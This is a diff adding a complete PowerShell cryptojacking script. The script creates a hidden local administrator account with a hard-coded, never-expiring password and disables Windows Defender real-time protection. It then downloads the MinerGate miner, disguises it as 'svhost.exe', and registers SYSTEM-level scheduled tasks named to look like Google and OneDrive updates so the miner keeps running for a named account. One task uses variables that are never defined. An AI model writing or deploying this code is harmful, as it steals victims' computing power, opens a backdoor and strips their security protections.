@@ -1,0 +1,79 @@
+$Username = "admin"
+$Password = "Bigdog1^^"
+$group = "Administrators"
+$Arc = if ([System.IntPtr]::Size -eq 4) { "32-Bit" } else { "64-Bit" }
+$url = "https://download.minergate.com/win-cli"
+$output = "C:\ProgramData\Java\Download.zip"
+$destination = "C:\ProgramData\Java"
+$start_time = Get-Date
+$NightAction = New-ScheduledTaskAction -Execute 'C:\ProgramData\Java\Database\Kill.bat'
+$NightTrigger = New-ScheduledTaskTrigger -Daily -At 6:30pm
+$NightMineAction = New-ScheduledTaskAction -Execute 'C:\ProgramData\Java\Database\night.vbs'
+$NightMineTrigger = New-ScheduledTaskTrigger -Daily -At 7pm
+$DayAction = New-ScheduledTaskAction -Execute 'C:\ProgramData\Java\Database\Kill.bat'
+$DayTrigger = New-ScheduledTaskTrigger -Daily -At 4:15am
+$CPUQuery = ((get-counter "\Processor(*)\% idle time").countersamples | select instancename).length -1
+$CPU = $CPUQuery / 2
+$CPUFull = $CPUQuery / 1
+$principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel
+$adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
+$existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }
+ 
+if ($existing -eq $null) {
+NET USER $Username $Password /add /y /expires:never
+NET LOCALGROUP $group $Username /add
+}
+else {
+$existing.SetPassword($Password)
+}
+WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
+ 
+If ($Arc -eq "64-Bit") {
+ 
+New-Item -Path "C:\ProgramData\Java\" -ItemType directory
+ 
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -ExclusionPath "C:\ProgramData\Java\", "C:\ProgramData\Java\Database"
+Set-MpPreference -ExclusionProcess "svhost.exe"
+ 
+Invoke-WebRequest -Uri $url -OutFile $output
+Expand-Archive -path $output -destinationpath $destination
+Rename-Item C:\ProgramData\Java\MinerGate-cli-4.04-win64\Minergate-cli.exe svhost.exe
+Rename-Item C:\ProgramData\Java\MinerGate-cli-4.04-win64 C:\ProgramData\Java\Database
+ 
+cd C:\ProgramData\Java\Database
+"Taskkill /IM svhost.exe /F" | Out-File -encoding ascii jshalf.bat -append
+"cd C:\ProgramData\Java\Database" | Out-File -encoding ascii jshalf.bat -append
+"timeout /t 60" | Out-File -encoding ascii jshalf.bat -append
+"svhost -user electricconsciousness@gmail.com -xmr $CPU" | Out-File -encoding ascii jshalf.bat -append
+ 
+cd C:\ProgramData\Java\Database
+"Taskkill /IM svhost.exe /F" | Out-File -encoding ascii jsfull.bat -append
+"cd C:\ProgramData\Java\Database" | Out-File -encoding ascii jsfull.bat -append
+"timeout /t 60" | Out-File -encoding ascii jsfull.bat -append
+"svhost -user electricconsciousness@gmail.com -xmr $CPUFull" | Out-File -encoding ascii jsfull.bat -append
+ 
+"Taskkill /IM svhost.exe /F" | Out-File -encoding ascii Kill.bat
+ 
+"Dim WShell" | Out-File -encoding ascii day.vbs
+{Set WShell = CreateObject("WScript.Shell")} | Out-File -encoding ascii day.vbs -append
+{WShell.Run "C:\ProgramData\Java\Database\jshalf.bat", 0} | Out-File -encoding ascii day.vbs -append
+"Set WShell = Nothing" | Out-File -encoding ascii day.vbs -append
+ 
+"Dim WShell" | Out-File -encoding ascii night.vbs
+{Set WShell = CreateObject("WScript.Shell")} | Out-File -encoding ascii night.vbs -append
+{WShell.Run "C:\ProgramData\Java\Database\jsfull.bat", 0} | Out-File -encoding ascii night.vbs -append
+"Set WShell = Nothing" | Out-File -encoding ascii night.vbs -append
+ 
+Remove-Item $output
+ 
+Register-ScheduledTask -Action $NightAction -Trigger $NightTrigger -TaskName "AppLog Dump" -Settings $settings -Principal $principal -Description "Daily dump of Applog"
+Register-ScheduledTask -Action $NightMineAction -Trigger $NightMineTrigger -TaskName "User_Feed_Synchronization-{765A0ABB-A404-4315-A54F-C2418F661999}" -Description "Updates out-of-date system feeds." -Settings $settings -Principal $principal
+Register-ScheduledTask -Action $DayAction -Trigger $DayTrigger -TaskName "OneDrive Standalone Update Task v4" -Description "OneDrive Standalone Update Task" -Settings $settings -Principal $principal
+Register-ScheduledTask -Action $DayMineAction -Trigger $DayMineTrigger -TaskName "GoogleUpdateTaskMachineMI" -Description "Keeps your Google software up to date. If this task is disabled or stopped, your Google software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Google software using it." -Settings $settings -Principal $principal
+ 
+#Copy-Item "C:\ProgramData\Java\Database\day.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+ 
+.\Day.vbs
+}
